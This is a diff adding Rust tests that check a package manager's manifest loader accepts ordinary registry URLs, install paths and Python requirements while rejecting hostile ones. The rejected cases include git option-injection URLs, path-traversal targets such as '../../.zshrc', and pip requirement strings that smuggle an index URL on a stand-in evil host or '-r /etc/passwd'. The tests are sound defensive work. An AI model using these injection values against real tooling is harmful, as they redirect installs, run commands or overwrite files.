@@ -1813,3 +1813,183 @@ fn generate_houdini_native_package_sidefx_rejects_a_build_level_bound() {
         "error should name the bound it cannot express, got: {err}"
     );
 }
+
+/// The registry URL forms studios use keep loading from `hpm.toml`.
+#[test]
+fn registry_url_forms_load() {
+    for (url, kind) in [
+        ("https://api.tumbletrove.com/v1/registry", "api"),
+        ("https://github.com/studio/registry.git", "git"),
+        ("ssh://git@git.example.invalid/studio/registry.git", "git"),
+        ("git@github.com:studio/registry.git", "git"),
+        ("file:///mnt/nas/hpm-registry.git", "git"),
+        ("/mnt/nas/hpm-registry.git", "git"),
+        ("//nas/share/hpm-registry.git", "git"),
+        ("Z:/hpm-registry.git", "git"),
+        ("../shared/registry.git", "git"),
+    ] {
+        let toml_str = format!(
+            "[package]\npath = \"studio/ctx\"\nname = \"Ctx\"\nversion = \"0.1.0\"\n\n[[registries]]\nname = \"Studio.Reg\"\nurl = '{url}'\ntype = \"{kind}\"\n"
+        );
+        let manifest: PackageManifest =
+            toml::from_str(&toml_str).unwrap_or_else(|e| panic!("{url}: {e}"));
+        assert_eq!(manifest.registries[0].url, url);
+    }
+}
+
+/// A git registry url that `git` would read as an option or a helper
+/// transport fails the manifest load, naming the registry.
+#[test]
+fn hostile_git_registry_urls_fail_the_load() {
+    for url in [
+        "--upload-pack=touch x",
+        "-u x",
+        "ext::sh -c touch% x",
+        "fd::7",
+        "git://host.example.invalid/r.git",
+        "http://host.example.invalid/r.git",
+    ] {
+        let toml_str = format!(
+            "[package]\npath = \"studio/ctx\"\nname = \"Ctx\"\nversion = \"0.1.0\"\n\n[[registries]]\nname = \"evil\"\nurl = '{url}'\ntype = \"git\"\n"
+        );
+        let err = toml::from_str::<PackageManifest>(&toml_str)
+            .expect_err(url)
+            .to_string();
+        assert!(err.contains("registry 'evil'"), "{url}: {err}");
+    }
+}
+
+/// Place-rule `to` values authors use keep loading.
+#[test]
+fn place_rule_targets_load() {
+    for to in [
+        "dso/macos-aarch64/",
+        "./",
+        ".",
+        "bin/tool",
+        "a/b/c.so",
+        "lib..d/",
+    ] {
+        let toml_str = format!(
+            "[package]\npath = \"studio/ctx\"\nname = \"Ctx\"\nversion = \"0.1.0\"\n\n[compat]\nplatforms = [\"macos-aarch64\"]\n\n[[stage.platform.macos-aarch64.place]]\nfrom = \"build/*\"\nto = '{to}'\n"
+        );
+        let manifest: PackageManifest =
+            toml::from_str(&toml_str).unwrap_or_else(|e| panic!("{to}: {e}"));
+        let rules = &manifest.stage.platform.entries[0].place;
+        assert_eq!(rules[0].to, to);
+    }
+}
+
+/// A place-rule `to` that leaves the install image fails the manifest load.
+#[test]
+fn escaping_place_rule_targets_fail_the_load() {
+    for to in [
+        "../x",
+        "../../.zshrc",
+        "a/../../x",
+        "/abs/x",
+        "..\\x",
+        "C:\\x",
+        "C:x",
+        "a:b",
+    ] {
+        let toml_str = format!(
+            "[package]\npath = \"studio/ctx\"\nname = \"Ctx\"\nversion = \"0.1.0\"\n\n[compat]\nplatforms = [\"macos-aarch64\"]\n\n[[stage.platform.macos-aarch64.place]]\nfrom = \"build/*\"\nto = '{to}'\n"
+        );
+        assert!(
+            toml::from_str::<PackageManifest>(&toml_str).is_err(),
+            "loaded to = {to:?}"
+        );
+    }
+}
+
+/// URL dependencies pinned to prerelease and build-metadata versions load.
+#[test]
+fn url_dependency_versions_load() {
+    for version in ["1.0.0", "1.0.0-beta.1", "1.0.0-beta.1+b5", "2.3.4+20261113"] {
+        let toml_str = format!(
+            "[package]\npath = \"studio/ctx\"\nname = \"Ctx\"\nversion = \"0.1.0\"\n\n[dependencies]\n\"acme/tools\" = {{ url = \"https://example.invalid/t.zip\", version = \"{version}\" }}\n"
+        );
+        toml::from_str::<PackageManifest>(&toml_str).unwrap_or_else(|e| panic!("{version}: {e}"));
+    }
+}
+
+/// A URL dependency's `version` is a version, not a path: one that is not
+/// semver fails the manifest load.
+#[test]
+fn non_semver_url_dependency_versions_fail_the_load() {
+    for version in [
+        "1/../../x",
+        "1\\\\..\\\\x",
+        "C:x",
+        "1.0.0/x",
+        "latest",
+        "../1.0.0",
+    ] {
+        let toml_str = format!(
+            "[package]\npath = \"studio/ctx\"\nname = \"Ctx\"\nversion = \"0.1.0\"\n\n[dependencies]\n\"acme/tools\" = {{ url = \"https://example.invalid/t.zip\", version = \"{version}\" }}\n"
+        );
+        assert!(
+            toml::from_str::<PackageManifest>(&toml_str).is_err(),
+            "loaded version {version:?}"
+        );
+    }
+}
+
+/// The Python dependency forms package authors use keep loading: PEP 440
+/// operators, local versions, prereleases, spaces, hpm's `^` shorthand,
+/// dotted, underscored and mixed-case names, and extras.
+#[test]
+fn python_dependency_forms_load() {
+    let toml_str = r#"
+[package]
+path = "studio/ctx"
+name = "Ctx"
+version = "0.1.0"
+
+[python_dependencies]
+numpy = ">=1.20"
+anyver = "*"
+ranged = ">=1,<2"
+wild = "==1.0.*"
+compat = "~=2.1"
+notthis = "!=1.3"
+exact = "===1.0"
+pre = ">=1.0rc1"
+torch = "==2.1.0+cu118"
+spaced = ">= 1.0, < 2.0"
+caret = "^2.28.0"
+"ruamel.yaml" = ">=0.17"
+typing_extensions = ">=4"
+PyYAML = ">=6"
+requests = { version = ">=2.28", extras = ["socks", "use_chardet_on_py3"] }
+"#;
+    let manifest: PackageManifest = toml::from_str(toml_str).unwrap();
+    assert_eq!(manifest.python_dependencies.len(), 15);
+}
+
+/// A dependency's Python requirement is one requirement: a version, name or
+/// extra that would add a pip option line, a direct URL or VCS reference, or
+/// an environment marker fails the manifest load.
+#[test]
+fn injected_python_requirements_fail_the_load() {
+    let header = "[package]\npath = \"studio/ctx\"\nname = \"Ctx\"\nversion = \"0.1.0\"\n\n[python_dependencies]\n";
+    for entry in [
+        "numpy = \">=1\\n--index-url https://evil.invalid/simple\"",
+        "numpy = \">=1\\r\\n-e git+https://evil.invalid/x\"",
+        "numpy = \"@ https://evil.invalid/numpy.tar.gz\"",
+        "numpy = \">=1; python_version > '0'\"",
+        "numpy = \"-r /etc/passwd\"",
+        "\"x @ https://evil.invalid/x.tar.gz\" = \"*\"",
+        "\"--extra-index-url\" = \"*\"",
+        "\"numpy\\n--index-url https://evil.invalid\" = \"*\"",
+        "requests = { version = \">=2\", extras = [\"socks]\\n--index-url https://evil.invalid\"] }",
+        "requests = { version = \">=2\", extras = [\"a,b\"] }",
+    ] {
+        let toml_str = format!("{header}{entry}\n");
+        assert!(
+            toml::from_str::<PackageManifest>(&toml_str).is_err(),
+            "loaded {entry}"
+        );
+    }
+}
